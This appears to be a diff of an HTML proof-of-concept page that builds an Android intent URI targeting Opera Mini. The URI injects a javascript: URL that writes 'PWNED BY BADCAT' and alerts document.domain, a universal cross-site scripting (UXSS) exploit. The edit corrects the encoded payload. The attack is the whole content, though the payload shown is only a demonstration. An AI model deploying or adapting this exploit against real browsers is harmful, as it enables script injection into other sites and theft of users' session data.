@@ -16,7 +16,7 @@
   <script>
     const params = new URLSearchParams(location.search);
     const app = document.querySelector('#app');
-    const exploit = 'intent://open/#Intent;action=com.opera.android.action.OPEN_URL;S.action_open_url=javascript%3Adocument.write%2528%2527PWNED%2520BY%2520BADCAT%2527%2529%253Balert%2528%252Bdocument.domain%2529;B.action_new_tab=false;B.action_inject_startpage=false;SEL;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;scheme=https;package=com.opera.mini.native;end';
+    const exploit = 'intent://open/#Intent;action=com.opera.android.action.OPEN_URL;S.action_open_url=javascript%3Adocument.write%2528%2527PWNED%2520BY%2520BADCAT%2527%2529%253Balert%2528document.domain%2529;B.action_new_tab=false;B.action_inject_startpage=false;SEL;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;scheme=https;package=com.opera.mini.native;end';
 
     if (params.get('stage') === 'bounce') {
       app.innerHTML = '<h1>UXSS</h1>';
